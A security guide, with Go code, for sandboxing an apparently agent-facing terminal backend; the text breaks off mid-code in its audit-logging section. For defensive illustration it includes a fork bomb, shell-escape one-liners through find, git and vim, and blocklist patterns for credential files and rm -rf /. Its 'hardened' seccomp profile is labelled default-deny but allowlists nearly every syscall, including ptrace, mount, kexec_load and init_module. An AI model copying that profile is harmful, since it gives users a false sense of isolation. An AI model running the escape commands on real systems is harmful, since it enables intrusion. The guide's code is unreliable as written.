# PTY/Terminal Security Best Practices for Agent-Facing Applications

## Executive Summary

This document provides comprehensive security guidance for securing PTY/terminal implementations in agent-facing applications, with specific focus on the Go backend terminal system. Based on 2025 industry research and OWASP guidelines for agentic applications, this guide covers defense-in-depth strategies including sandboxing, command validation, resource limits, audit logging, and network isolation.

---

## Table of Contents

1. [Current Security Posture Assessment](#current-security-posture-assessment)
2. [Threat Model](#threat-model)
3. [Defense-in-Depth Strategy](#defense-in-depth-strategy)
4. [Sandboxing Strategies](#sandboxing-strategies)
5. [Command Validation & Execution Controls](#command-validation--execution-controls)
6. [Resource Limits (CPU, Memory, File Descriptors)](#resource-limits)
7. [Network Isolation](#network-isolation)
8. [Audit Logging](#audit-logging)
9. [Shell Escape Prevention](#shell-escape-prevention)
10. [Environment Variable Security](#environment-variable-security)
11. [Implementation Roadmap](#implementation-roadmap)
12. [References](#references)

---

## Current Security Posture Assessment

### Existing Implementation Analysis

**File: `/Users/ososerious/BusinessOS-1/desktop/backend-go/internal/terminal/pty.go`**

#### Current Security Controls
- ✅ **Session limits**: 5 per user, 100 global
- ✅ **Idle timeout**: 30-minute automatic cleanup
- ✅ **User isolation**: Sessions tied to authenticated user_id
- ✅ **Graceful shutdown**: SIGTERM with 2-second timeout before SIGKILL

#### Critical Security Gaps
- ❌ **No command sandboxing**: Direct shell execution without isolation
- ❌ **No resource limits**: Unlimited CPU, memory, file descriptors
- ❌ **No command validation**: Any command can be executed
- ❌ **No audit logging**: No record of executed commands
- ❌ **No network isolation**: Full network access from terminal
- ❌ **Environment variable leakage**: Inherits all host environment variables
- ❌ **No shell escape protection**: Terminal escape sequences not sanitized
- ❌ **Working directory unrestricted**: Can navigate entire filesystem

### Risk Level: **HIGH**

The current implementation allows authenticated users to execute arbitrary commands with the privileges of the backend process, access the entire filesystem, and potentially exfiltrate data or compromise the host system.

---

## Threat Model

### Attack Vectors

1. **Command Injection via Shell Metacharacters**
   - User input containing `;`, `&&`, `||`, `|` to chain commands
   - Backticks or `$()` for command substitution

2. **Shell Escape Attacks**
   - ANSI/VT terminal escape sequences to manipulate client terminals
   - Control characters to bypass logging or hide malicious activity

3. **Privilege Escalation**
   - Exploiting setuid binaries or sudo access
   - Container escape via kernel vulnerabilities

4. **Resource Exhaustion (DoS)**
   - Fork bombs: `:(){ :|:& };:`
   - Memory exhaustion: Large file operations, memory allocation
   - CPU exhaustion: Infinite loops, crypto mining

5. **Data Exfiltration**
   - Unrestricted network access to send data externally
   - Read sensitive files (SSH keys, credentials, environment variables)

6. **Lateral Movement**
   - Network scanning from terminal sessions
   - Accessing internal services without network isolation

### Threat Actors

- **Malicious authenticated users**: Insider threats or compromised accounts
- **AI agents with manipulated prompts**: Prompt injection leading to RCE
- **Compromised third-party integrations**: Supply chain attacks

### OWASP Top 10 for Agentic Applications (2025)

Relevant risks from the [OWASP Agentic AI Security Guidelines](https://www.aikido.dev/blog/owasp-top-10-agentic-applications):

- **Tool Misuse (A03)**: Agent uses terminal tools with destructive parameters
- **Insufficient Sandboxing (A04)**: Lack of isolation enables system compromise
- **Excessive Permissions (A06)**: Terminal has full filesystem/network access

---

## Defense-in-Depth Strategy

Following the principle that **"a sandbox alone is not enough"**, implement multiple security layers:

```text
┌─────────────────────────────────────────┐
│  Layer 1: Input Validation              │
│  - Command whitelisting/blacklisting    │
│  - Argument validation                  │
│  - Path traversal prevention            │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  Layer 2: Execution Sandboxing          │
│  - Container isolation (Docker/gVisor)  │
│  - User namespaces                      │
│  - Seccomp filters                      │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  Layer 3: Resource Limits               │
│  - CPU quotas (cgroups)                 │
│  - Memory limits                        │
│  - Process count limits                 │
│  - File descriptor limits               │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  Layer 4: Network Isolation             │
│  - Default-deny egress                  │
│  - Domain allowlists                    │
│  - No localhost access                  │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  Layer 5: Audit & Monitoring            │
│  - Command execution logging            │
│  - File access monitoring               │
│  - Network activity logging             │
│  - Anomaly detection                    │
└─────────────────────────────────────────┘
```
---

## Sandboxing Strategies

### Risk-Based Sandbox Selection

| Risk Level | Use Case | Recommended Technology | Isolation Strength | Performance |
|------------|----------|------------------------|-------------------|-------------|
| **Low** | Read-only operations, trusted users | Hardened containers (Docker + seccomp) | Medium | High |
| **Medium** | AI agents executing code | gVisor (user-mode kernel) | High | Medium |
| **High** | Untrusted users, production systems | Firecracker microVMs, Kata Containers | Very High | Medium-Low |

### Option 1: Docker with Security Hardening (Recommended for Medium Risk)

**Pros:**
- Easy integration with existing infrastructure
- Good performance for most workloads
- Extensive tooling and community support

**Cons:**
- Containers share host kernel (not a security boundary per NIST)
- Recent CVEs (CVE-2025-31133, CVE-2025-52565, CVE-2025-52881)
- Requires proper hardening to be effective

#### Implementation with Go

```go
package terminal

import (
    "context"
    "fmt"
    "io"
    "os/exec"
    "time"

    "github.com/docker/docker/api/types/container"
    "github.com/docker/docker/client"
)

type DockerSandbox struct {
    cli         *client.Client
    containerID string
    imageName   string
}

func NewDockerSandbox(imageName string) (*DockerSandbox, error) {
    cli, err := client.NewClientWithOpts(client.FromEnv)
    if err != nil {
        return nil, fmt.Errorf("failed to create Docker client: %w", err)
    }

    return &DockerSandbox{
        cli:       cli,
        imageName: imageName,
    }, nil
}

func (ds *DockerSandbox) Start(userID string) error {
    ctx := context.Background()

    // Security-hardened container configuration
    config := &container.Config{
        Image:        ds.imageName,
        Tty:          true,
        AttachStdin:  true,
        AttachStdout: true,
        AttachStderr: true,
        OpenStdin:    true,
        User:         "1000:1000", // Non-root user
        WorkingDir:   "/workspace",
        Env: []string{
            "TERM=xterm-256color",
            "LANG=en_US.UTF-8",
            // DO NOT pass sensitive host env vars
        },
    }

    hostConfig := &container.HostConfig{
        // Resource limits (CPU)
        NanoCPUs:  1000000000, // 1 CPU core
        CPUPeriod: 100000,
        CPUQuota:  50000, // 50% of 1 core

        // Memory limits
        Memory:     512 * 1024 * 1024, // 512 MB
        MemorySwap: 512 * 1024 * 1024, // No swap

        // Process limits
        PidsLimit: ptrInt64(100), // Max 100 processes

        // Security options
        SecurityOpt: []string{
            "no-new-privileges:true",
            "seccomp=/path/to/seccomp-profile.json",
        },

        // Capabilities - drop all, add only required
        CapDrop: []string{"ALL"},
        CapAdd:  []string{}, // Add minimal required caps

        // Read-only root filesystem
        ReadonlyRootfs: true,

        // Network isolation
        NetworkMode: "none", // No network access by default

        // Filesystem binds (read-only)
        Binds: []string{
            fmt.Sprintf("/workspace/%s:/workspace:ro", userID),
        },

        // Tmpfs for temporary files
        Tmpfs: map[string]string{
            "/tmp": "rw,noexec,nosuid,size=100m",
        },
    }

    resp, err := ds.cli.ContainerCreate(
        ctx,
        config,
        hostConfig,
        nil,
        nil,
        fmt.Sprintf("terminal-%s", userID),
    )
    if err != nil {
        return fmt.Errorf("failed to create container: %w", err)
    }

    ds.containerID = resp.ID

    if err := ds.cli.ContainerStart(ctx, ds.containerID, container.StartOptions{}); err != nil {
        return fmt.Errorf("failed to start container: %w", err)
    }

    return nil
}

func (ds *DockerSandbox) Exec(command string) (string, error) {
    ctx := context.Background()

    execConfig := container.ExecOptions{
        Cmd:          []string{"/bin/sh", "-c", command},
        AttachStdout: true,
        AttachStderr: true,
    }

    execID, err := ds.cli.ContainerExecCreate(ctx, ds.containerID, execConfig)
    if err != nil {
        return "", fmt.Errorf("failed to create exec: %w", err)
    }

    resp, err := ds.cli.ContainerExecAttach(ctx, execID.ID, container.ExecAttachOptions{})
    if err != nil {
        return "", fmt.Errorf("failed to attach exec: %w", err)
    }
    defer resp.Close()

    output, err := io.ReadAll(resp.Reader)
    if err != nil {
        return "", fmt.Errorf("failed to read output: %w", err)
    }

    return string(output), nil
}

func (ds *DockerSandbox) Stop() error {
    ctx := context.Background()
    timeout := 5

    return ds.cli.ContainerStop(ctx, ds.containerID, container.StopOptions{
        Timeout: &timeout,
    })
}

func (ds *DockerSandbox) Remove() error {
    ctx := context.Background()

    return ds.cli.ContainerRemove(ctx, ds.containerID, container.RemoveOptions{
        Force: true,
    })
}

func ptrInt64(i int64) *int64 {
    return &i
}
```

**Seccomp Profile** (`/path/to/seccomp-profile.json`):

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "close", "stat", "fstat", "lstat",
        "poll", "lseek", "mmap", "mprotect", "munmap", "brk",
        "rt_sigaction", "rt_sigprocmask", "rt_sigreturn", "ioctl",
        "pread64", "pwrite64", "readv", "writev", "access", "pipe",
        "select", "sched_yield", "mremap", "msync", "mincore", "madvise",
        "dup", "dup2", "pause", "nanosleep", "getitimer", "alarm",
        "setitimer", "getpid", "sendfile", "socket", "connect", "accept",
        "sendto", "recvfrom", "sendmsg", "recvmsg", "shutdown", "bind",
        "listen", "getsockname", "getpeername", "socketpair", "setsockopt",
        "getsockopt", "clone", "fork", "vfork", "execve", "exit", "wait4",
        "kill", "uname", "fcntl", "flock", "fsync", "fdatasync",
        "truncate", "ftruncate", "getdents", "getcwd", "chdir", "fchdir",
        "rename", "mkdir", "rmdir", "creat", "link", "unlink", "symlink",
        "readlink", "chmod", "fchmod", "chown", "fchown", "lchown", "umask",
        "gettimeofday", "getrlimit", "getrusage", "sysinfo", "times", "ptrace",
        "getuid", "syslog", "getgid", "setuid", "setgid", "geteuid", "getegid",
        "setpgid", "getppid", "getpgrp", "setsid", "setreuid", "setregid",
        "getgroups", "setgroups", "setresuid", "getresuid", "setresgid",
        "getresgid", "getpgid", "setfsuid", "setfsgid", "getsid", "capget",
        "capset", "rt_sigpending", "rt_sigtimedwait", "rt_sigqueueinfo",
        "rt_sigsuspend", "sigaltstack", "utime", "mknod", "uselib", "personality",
        "ustat", "statfs", "fstatfs", "sysfs", "getpriority", "setpriority",
        "sched_setparam", "sched_getparam", "sched_setscheduler",
        "sched_getscheduler", "sched_get_priority_max", "sched_get_priority_min",
        "sched_rr_get_interval", "mlock", "munlock", "mlockall", "munlockall",
        "vhangup", "modify_ldt", "pivot_root", "_sysctl", "prctl", "arch_prctl",
        "adjtimex", "setrlimit", "chroot", "sync", "acct", "settimeofday",
        "mount", "umount2", "swapon", "swapoff", "reboot", "sethostname",
        "setdomainname", "iopl", "ioperm", "create_module", "init_module",
        "delete_module", "get_kernel_syms", "query_module", "quotactl",
        "nfsservctl", "getpmsg", "putpmsg", "afs_syscall", "tuxcall",
        "security", "gettid", "readahead", "setxattr", "lsetxattr",
        "fsetxattr", "getxattr", "lgetxattr", "fgetxattr", "listxattr",
        "llistxattr", "flistxattr", "removexattr", "lremovexattr",
        "fremovexattr", "tkill", "time", "futex", "sched_setaffinity",
        "sched_getaffinity", "set_thread_area", "io_setup", "io_destroy",
        "io_getevents", "io_submit", "io_cancel", "get_thread_area",
        "lookup_dcookie", "epoll_create", "epoll_ctl_old", "epoll_wait_old",
        "remap_file_pages", "getdents64", "set_tid_address", "restart_syscall",
        "semtimedop", "fadvise64", "timer_create", "timer_settime",
        "timer_gettime", "timer_getoverrun", "timer_delete", "clock_settime",
        "clock_gettime", "clock_getres", "clock_nanosleep", "exit_group",
        "epoll_wait", "epoll_ctl", "tgkill", "utimes", "vserver", "mbind",
        "set_mempolicy", "get_mempolicy", "mq_open", "mq_unlink",
        "mq_timedsend", "mq_timedreceive", "mq_notify", "mq_getsetattr",
        "kexec_load", "waitid", "add_key", "request_key", "keyctl",
        "ioprio_set", "ioprio_get", "inotify_init", "inotify_add_watch",
        "inotify_rm_watch", "migrate_pages", "openat", "mkdirat", "mknodat",
        "fchownat", "futimesat", "newfstatat", "unlinkat", "renameat",
        "linkat", "symlinkat", "readlinkat", "fchmodat", "faccessat",
        "pselect6", "ppoll", "unshare", "set_robust_list", "get_robust_list",
        "splice", "tee", "sync_file_range", "vmsplice", "move_pages",
        "utimensat", "epoll_pwait", "signalfd", "timerfd_create", "eventfd",
        "fallocate", "timerfd_settime", "timerfd_gettime", "accept4",
        "signalfd4", "eventfd2", "epoll_create1", "dup3", "pipe2",
        "inotify_init1", "preadv", "pwritev", "rt_tgsigqueueinfo",
        "perf_event_open", "recvmmsg", "fanotify_init", "fanotify_mark",
        "prlimit64", "name_to_handle_at", "open_by_handle_at", "clock_adjtime",
        "syncfs", "sendmmsg", "setns", "getcpu", "process_vm_readv",
        "process_vm_writev", "kcmp", "finit_module", "sched_setattr",
        "sched_getattr", "renameat2", "seccomp", "getrandom", "memfd_create",
        "kexec_file_load", "bpf", "execveat", "userfaultfd", "membarrier",
        "mlock2", "copy_file_range", "preadv2", "pwritev2"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### Option 2: gVisor (Recommended for High Risk)

**Pros:**
- User-space kernel provides strong isolation
- Better performance than VMs
- OCI-compatible, works with Docker/Kubernetes

**Cons:**
- Significant performance degradation for I/O operations
- Not all system calls supported

#### Installation and Usage

```bash
# Install gVisor
(
  set -e
  ARCH=$(uname -m)
  URL=https://storage.googleapis.com/gvisor/releases/release/latest/${ARCH}
  wget ${URL}/runsc ${URL}/runsc.sha512 \
    ${URL}/containerd-shim-runsc-v1 ${URL}/containerd-shim-runsc-v1.sha512
  sha512sum -c runsc.sha512 \
    -c containerd-shim-runsc-v1.sha512
  rm -f *.sha512
  chmod a+rx runsc containerd-shim-runsc-v1
  sudo mv runsc containerd-shim-runsc-v1 /usr/local/bin
)

# Configure Docker to use gVisor runtime
sudo tee /etc/docker/daemon.json <<EOF
{
  "runtimes": {
    "runsc": {
      "path": "/usr/local/bin/runsc"
    }
  }
}
EOF

sudo systemctl restart docker
```

**Go Implementation:**

```go
// Modify DockerSandbox to use gVisor runtime
func (ds *DockerSandbox) Start(userID string) error {
    ctx := context.Background()

    config := &container.Config{
        // ... same as before
    }

    hostConfig := &container.HostConfig{
        // ... same as before
        Runtime: "runsc", // Use gVisor runtime
    }

    // ... rest of implementation
}
```

### Option 3: Firejail / Bubblewrap (Linux-only, Process-Level Sandboxing)

**Comparison:**

| Feature | Firejail | Bubblewrap |
|---------|----------|------------|
| **Ease of Use** | High - pre-built profiles | Low - requires scripting |
| **Security** | Medium - larger attack surface | High - minimal setuid binary |
| **Flexibility** | Medium - configuration-based | High - scriptable |
| **Use Case** | Desktop applications | Custom sandboxing, CI/CD |

#### Firejail Implementation

```go
package terminal

import (
    "fmt"
    "os/exec"
)

type FirejailSandbox struct {
    profilePath string
}

func NewFirejailSandbox(profilePath string) *FirejailSandbox {
    return &FirejailSandbox{
        profilePath: profilePath,
    }
}

func (fs *FirejailSandbox) ExecuteCommand(command string) (string, error) {
    // Firejail security flags
    args := []string{
        "--noprofile",              // Don't use default profile
        "--private",                // New /home directory
        "--private-tmp",            // Isolated /tmp
        "--noroot",                 // No root privileges
        "--nosound",                // No sound access
        "--no3d",                   // No 3D acceleration
        "--nodvd",                  // No DVD access
        "--nogroups",               // No supplementary groups
        "--ipc-namespace",          // Isolated IPC
        "--net=none",               // No network access
        "--seccomp",                // Enable seccomp filtering
        "--caps.drop=all",          // Drop all capabilities
        "--rlimit-cpu=60",          // 60 seconds max CPU time
        "--rlimit-fsize=100000000", // 100MB max file size
        "--rlimit-nproc=100",       // Max 100 processes
        "--rlimit-as=536870912",    // 512MB max address space
        "--shell=none",             // Don't start shell
        "--",
        "/bin/sh", "-c", command,
    }

    cmd := exec.Command("firejail", args...)
    output, err := cmd.CombinedOutput()

    if err != nil {
        return "", fmt.Errorf("firejail execution failed: %w\nOutput: %s", err, string(output))
    }

    return string(output), nil
}
```

#### Bubblewrap Implementation

```go
package terminal

import (
    "fmt"
    "os/exec"
)

type BubblewrapSandbox struct{}

func NewBubblewrapSandbox() *BubblewrapSandbox {
    return &BubblewrapSandbox{}
}

func (bs *BubblewrapSandbox) ExecuteCommand(command string) (string, error) {
    args := []string{
        "--unshare-all",           // Unshare all namespaces
        "--share-net",             // Optional: allow network (remove for isolation)
        "--ro-bind", "/usr", "/usr",
        "--ro-bind", "/lib", "/lib",
        "--ro-bind", "/lib64", "/lib64",
        "--ro-bind", "/bin", "/bin",
        "--ro-bind", "/sbin", "/sbin",
        "--proc", "/proc",
        "--dev", "/dev",
        "--tmpfs", "/tmp",
        "--tmpfs", "/run",
        "--dir", "/workspace",
        "--chdir", "/workspace",
        "--die-with-parent",
        "--new-session",
        "--cap-drop", "ALL",      // Drop all capabilities
        "--",
        "/bin/sh", "-c", command,
    }

    cmd := exec.Command("bwrap", args...)
    output, err := cmd.CombinedOutput()

    if err != nil {
        return "", fmt.Errorf("bubblewrap execution failed: %w\nOutput: %s", err, string(output))
    }

    return string(output), nil
}
```

---

## Command Validation & Execution Controls

### CRITICAL: Why Command Allowlists Alone Are Insufficient

From security research:

> "Maintaining allowlists of 'safe' commands without a sandbox is fundamentally flawed. Commands like find, grep, and git serve legitimate purposes but contain powerful parameters that enable code execution and file writes. The large set of potential flag combinations makes comprehensive filtering impractical."

**Example of "safe" command exploitation:**

```bash
# grep with arbitrary code execution
grep -e ".*" /etc/passwd --color=always | /bin/sh

# find with command execution
find . -name "*.txt" -exec /bin/sh {} \;

# git with arbitrary command execution
git --upload-pack="id; ls -la" clone

# vim with shell escape
vim -c ':!bash' -c ':q'
```

### Defense Strategy: Sandboxing + Facade Pattern

```go
package terminal

import (
    "fmt"
    "regexp"
    "strings"
)

// CommandValidator validates and sanitizes commands
type CommandValidator struct {
    allowedCommands map[string]*CommandSpec
    blockedPatterns []*regexp.Regexp
}

type CommandSpec struct {
    Name            string
    AllowedFlags    []string
    RequiresSandbox bool
    MaxArgs         int
}

func NewCommandValidator() *CommandValidator {
    return &CommandValidator{
        allowedCommands: map[string]*CommandSpec{
            "ls": {
                Name:            "ls",
                AllowedFlags:    []string{"-l", "-a", "-h", "-t", "-r"},
                RequiresSandbox: false,
                MaxArgs:         10,
            },
            "cat": {
                Name:            "cat",
                AllowedFlags:    []string{"-n", "-v"},
                RequiresSandbox: false,
                MaxArgs:         5,
            },
            "pwd": {
                Name:            "pwd",
                AllowedFlags:    []string{},
                RequiresSandbox: false,
                MaxArgs:         0,
            },
            "echo": {
                Name:            "echo",
                AllowedFlags:    []string{"-n", "-e"},
                RequiresSandbox: false,
                MaxArgs:         100,
            },
            // High-risk commands MUST run in sandbox
            "python": {
                Name:            "python",
                AllowedFlags:    []string{"-c"},
                RequiresSandbox: true, // MANDATORY
                MaxArgs:         5,
            },
            "node": {
                Name:            "node",
                AllowedFlags:    []string{"-e"},
                RequiresSandbox: true,
                MaxArgs:         5,
            },
        },
        blockedPatterns: []*regexp.Regexp{
            // Shell metacharacters
            regexp.MustCompile(`[;&|><\$\`]`),

            // Command substitution
            regexp.MustCompile(`\$\(.*\)`),
            regexp.MustCompile("`.*`"),

            // Redirection
            regexp.MustCompile(`>|<|>>`),

            // Dangerous file access
            regexp.MustCompile(`/etc/(passwd|shadow|sudoers)`),
            regexp.MustCompile(`/\.ssh/`),
            regexp.MustCompile(`/\.aws/`),

            // Known exploit patterns
            regexp.MustCompile(`rm\s+-rf\s+/`),
            regexp.MustCompile(`:\(\)\{\s*:\|:&\s*\};:`), // Fork bomb
        },
    }
}

func (cv *CommandValidator) Validate(cmdLine string) error {
    // Check for blocked patterns
    for _, pattern := range cv.blockedPatterns {
        if pattern.MatchString(cmdLine) {
            return fmt.Errorf("command contains blocked pattern: %s", pattern.String())
        }
    }

    // Parse command
    parts := strings.Fields(cmdLine)
    if len(parts) == 0 {
        return fmt.Errorf("empty command")
    }

    cmdName := parts[0]

    // Check if command is allowed
    spec, allowed := cv.allowedCommands[cmdName]
    if !allowed {
        return fmt.Errorf("command not allowed: %s", cmdName)
    }

    // Validate arguments
    if len(parts)-1 > spec.MaxArgs {
        return fmt.Errorf("too many arguments for %s (max %d)", cmdName, spec.MaxArgs)
    }

    // Validate flags
    for _, arg := range parts[1:] {
        if strings.HasPrefix(arg, "-") {
            if !contains(spec.AllowedFlags, arg) {
                return fmt.Errorf("flag not allowed for %s: %s", cmdName, arg)
            }
        }
    }

    return nil
}

func (cv *CommandValidator) RequiresSandbox(cmdLine string) bool {
    parts := strings.Fields(cmdLine)
    if len(parts) == 0 {
        return true // Unknown commands always sandboxed
    }

    spec, exists := cv.allowedCommands[parts[0]]
    if !exists {
        return true // Unknown commands always sandboxed
    }

    return spec.RequiresSandbox
}

func contains(slice []string, item string) bool {
    for _, s := range slice {
        if s == item {
            return true
        }
    }
    return false
}
```

### Secure Command Execution with Argument Separation

**WRONG - Vulnerable to injection:**

```go
// DON'T DO THIS
cmd := exec.Command("sh", "-c", "ls "+userInput)
```

**CORRECT - Proper argument separation:**

```go
// Use exec.Command with separate arguments
func SafeExecute(command string, args ...string) (string, error) {
    // Validate command is in allowlist
    if !isAllowed(command) {
        return "", fmt.Errorf("command not allowed: %s", command)
    }

    // Use -- to separate flags from arguments
    safeArgs := append([]string{"--"}, args...)

    cmd := exec.Command(command, safeArgs...)

    // DO NOT inherit all environment variables
    cmd.Env = []string{
        "PATH=/usr/local/bin:/usr/bin:/bin",
        "TERM=xterm-256color",
        "LANG=en_US.UTF-8",
    }

    output, err := cmd.CombinedOutput()
    if err != nil {
        return "", fmt.Errorf("execution failed: %w", err)
    }

    return string(output), nil
}
```

---

## Resource Limits

### Why Resource Limits Are Critical

Without resource limits, malicious users can:
- **CPU exhaustion**: Crypto mining, infinite loops
- **Memory exhaustion**: OOM killer crashes host
- **Process exhaustion**: Fork bombs prevent new logins
- **Disk exhaustion**: Fill disk with logs/temp files

### Option 1: Using cgroups Directly (Linux)

```go
package terminal

import (
    "fmt"
    "os"
    "path/filepath"
    "strconv"
    "syscall"
)

type CgroupLimits struct {
    MemoryLimitBytes int64  // e.g., 512 * 1024 * 1024 for 512MB
    CPUQuotaPercent  int    // e.g., 50 for 50% of 1 core
    PidsMax          int    // e.g., 100 for max 100 processes
}

func ApplyCgroupLimits(sessionID string, limits CgroupLimits) error {
    // Create cgroup for this session
    cgroupPath := filepath.Join("/sys/fs/cgroup", "terminal", sessionID)

    // Memory cgroup
    memoryPath := filepath.Join(cgroupPath, "memory")
    if err := os.MkdirAll(memoryPath, 0755); err != nil {
        return fmt.Errorf("failed to create memory cgroup: %w", err)
    }

    // Set memory limit
    memLimitFile := filepath.Join(memoryPath, "memory.limit_in_bytes")
    if err := os.WriteFile(memLimitFile, []byte(strconv.FormatInt(limits.MemoryLimitBytes, 10)), 0644); err != nil {
        return fmt.Errorf("failed to set memory limit: %w", err)
    }

    // CPU cgroup
    cpuPath := filepath.Join(cgroupPath, "cpu")
    if err := os.MkdirAll(cpuPath, 0755); err != nil {
        return fmt.Errorf("failed to create CPU cgroup: %w", err)
    }

    // CPU quota (50% of 1 core = 50000 out of 100000)
    cpuPeriod := 100000
    cpuQuota := (limits.CPUQuotaPercent * cpuPeriod) / 100

    cpuQuotaFile := filepath.Join(cpuPath, "cpu.cfs_quota_us")
    if err := os.WriteFile(cpuQuotaFile, []byte(strconv.Itoa(cpuQuota)), 0644); err != nil {
        return fmt.Errorf("failed to set CPU quota: %w", err)
    }

    cpuPeriodFile := filepath.Join(cpuPath, "cpu.cfs_period_us")
    if err := os.WriteFile(cpuPeriodFile, []byte(strconv.Itoa(cpuPeriod)), 0644); err != nil {
        return fmt.Errorf("failed to set CPU period: %w", err)
    }

    // PIDs cgroup
    pidsPath := filepath.Join(cgroupPath, "pids")
    if err := os.MkdirAll(pidsPath, 0755); err != nil {
        return fmt.Errorf("failed to create pids cgroup: %w", err)
    }

    pidsMaxFile := filepath.Join(pidsPath, "pids.max")
    if err := os.WriteFile(pidsMaxFile, []byte(strconv.Itoa(limits.PidsMax)), 0644); err != nil {
        return fmt.Errorf("failed to set pids limit: %w", err)
    }

    return nil
}

func AddProcessToCgroup(sessionID string, pid int) error {
    cgroupPath := filepath.Join("/sys/fs/cgroup", "terminal", sessionID)

    // Add to memory cgroup
    memProcsFile := filepath.Join(cgroupPath, "memory", "cgroup.procs")
    if err := os.WriteFile(memProcsFile, []byte(strconv.Itoa(pid)), 0644); err != nil {
        return fmt.Errorf("failed to add to memory cgroup: %w", err)
    }

    // Add to CPU cgroup
    cpuProcsFile := filepath.Join(cgroupPath, "cpu", "cgroup.procs")
    if err := os.WriteFile(cpuProcsFile, []byte(strconv.Itoa(pid)), 0644); err != nil {
        return fmt.Errorf("failed to add to CPU cgroup: %w", err)
    }

    // Add to PIDs cgroup
    pidsProcsFile := filepath.Join(cgroupPath, "pids", "cgroup.procs")
    if err := os.WriteFile(pidsProcsFile, []byte(strconv.Itoa(pid)), 0644); err != nil {
        return fmt.Errorf("failed to add to pids cgroup: %w", err)
    }

    return nil
}

func RemoveCgroup(sessionID string) error {
    cgroupPath := filepath.Join("/sys/fs/cgroup", "terminal", sessionID)
    return os.RemoveAll(cgroupPath)
}
```

### Option 2: Using proclimit Package (Cross-Platform)

```go
package terminal

import (
    "context"
    "fmt"
    "time"

    "github.com/aoldershaw/proclimit"
)

func ExecuteWithResourceLimits(command string, args []string) (string, error) {
    ctx := context.Background()

    // Create cgroup with resource limits
    cgroup, err := proclimit.NewCgroup(
        proclimit.WithMemoryLimit(512 * 1024 * 1024), // 512MB
        proclimit.WithCPULimit(50),                    // 50% of 1 core
    )
    if err != nil {
        return "", fmt.Errorf("failed to create cgroup: %w", err)
    }
    defer cgroup.Remove()

    // Create command with timeout
    ctx, cancel := context.WithTimeout(ctx, 60*time.Second)
    defer cancel()

    cmd := cgroup.CommandContext(ctx, command, args...)

    output, err := cmd.CombinedOutput()
    if err != nil {
        return "", fmt.Errorf("command failed: %w", err)
    }

    return string(output), nil
}
```

### Option 3: Using setrlimit (Process-Level Limits)

```go
package terminal

import (
    "fmt"
    "os/exec"
    "syscall"
)

func ExecuteWithRlimits(command string, args []string) (string, error) {
    cmd := exec.Command(command, args...)

    // Set resource limits via SysProcAttr
    cmd.SysProcAttr = &syscall.SysProcAttr{
        // Run as unprivileged user
        Credential: &syscall.Credential{
            Uid: 1000,
            Gid: 1000,
        },

        // Set resource limits
        Setrlimit: []syscall.Rlimit{
            // CPU time limit (60 seconds)
            {
                Resource: syscall.RLIMIT_CPU,
                Cur:      60,
                Max:      60,
            },
            // Memory limit (512MB)
            {
                Resource: syscall.RLIMIT_AS,
                Cur:      512 * 1024 * 1024,
                Max:      512 * 1024 * 1024,
            },
            // Process count limit
            {
                Resource: syscall.RLIMIT_NPROC,
                Cur:      100,
                Max:      100,
            },
            // File descriptor limit
            {
                Resource: syscall.RLIMIT_NOFILE,
                Cur:      256,
                Max:      256,
            },
            // File size limit (100MB)
            {
                Resource: syscall.RLIMIT_FSIZE,
                Cur:      100 * 1024 * 1024,
                Max:      100 * 1024 * 1024,
            },
        },
    }

    output, err := cmd.CombinedOutput()
    if err != nil {
        return "", fmt.Errorf("command failed: %w", err)
    }

    return string(output), nil
}
```

---

## Network Isolation

### Default-Deny Egress Strategy

From security research:

> "We sandboxed, but attackers still got out" often happens because the egress policy was permissive. The fix is default-deny egress, API-level perimeters (e.g., VPC-SC), and domain allowlists.

### Docker Network Isolation

```go
// In DockerSandbox.Start(), use:
hostConfig := &container.HostConfig{
    NetworkMode: "none", // Default: No network access
}

// OR for restricted network with allowlist:
hostConfig := &container.HostConfig{
    NetworkMode: "restricted-network",
}

// Create restricted network with iptables rules
func CreateRestrictedNetwork() error {
    // Create Docker network
    ctx := context.Background()
    cli, _ := client.NewClientWithOpts(client.FromEnv)

    _, err := cli.NetworkCreate(ctx, "restricted-network", network.CreateOptions{
        Driver: "bridge",
        Options: map[string]string{
            "com.docker.network.bridge.enable_ip_masquerade": "false",
        },
    })

    return err
}
```

### iptables Rules for Egress Control

```bash
#!/bin/bash
# Apply on host or within container

# Flush existing rules
iptables -F OUTPUT
iptables -F FORWARD

# Default deny
iptables -P OUTPUT DROP
iptables -P FORWARD DROP

# Allow loopback
iptables -A OUTPUT -o lo -j ACCEPT

# Allow established connections
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allowlist specific domains (DNS resolution)
# Example: Allow HTTPS to github.com, npmjs.com
iptables -A OUTPUT -p tcp -d github.com --dport 443 -j ACCEPT
iptables -A OUTPUT -p tcp -d npmjs.com --dport 443 -j ACCEPT

# Block all other outbound
iptables -A OUTPUT -j REJECT
```

### Go Implementation with Network Monitoring

```go
package terminal

import (
    "fmt"
    "net"
    "regexp"
)

type NetworkPolicy struct {
    AllowedDomains []string
    BlockedPorts   []int
}

func (np *NetworkPolicy) ValidateConnection(host string, port int) error {
    // Check if port is blocked
    for _, blockedPort := range np.BlockedPorts {
        if port == blockedPort {
            return fmt.Errorf("port %d is blocked", port)
        }
    }

    // Check if domain is allowed
    allowed := false
    for _, domain := range np.AllowedDomains {
        matched, _ := regexp.MatchString(domain, host)
        if matched {
            allowed = true
            break
        }
    }

    if !allowed {
        return fmt.Errorf("domain not in allowlist: %s", host)
    }

    return nil
}

func NewRestrictedDialer(policy *NetworkPolicy) func(network, addr string) (net.Conn, error) {
    return func(network, addr string) (net.Conn, error) {
        host, port, err := net.SplitHostPort(addr)
        if err != nil {
            return nil, fmt.Errorf("invalid address: %w", err)
        }

        portNum := 0
        fmt.Sscanf(port, "%d", &portNum)

        if err := policy.ValidateConnection(host, portNum); err != nil {
            return nil, fmt.Errorf("connection blocked: %w", err)
        }

        return net.Dial(network, addr)
    }
}
```

---

## Audit Logging

### Comprehensive Audit Log System

```go
package terminal

import (
    "context"
    "encoding/json"
    "fmt"
    "os"
    "time"

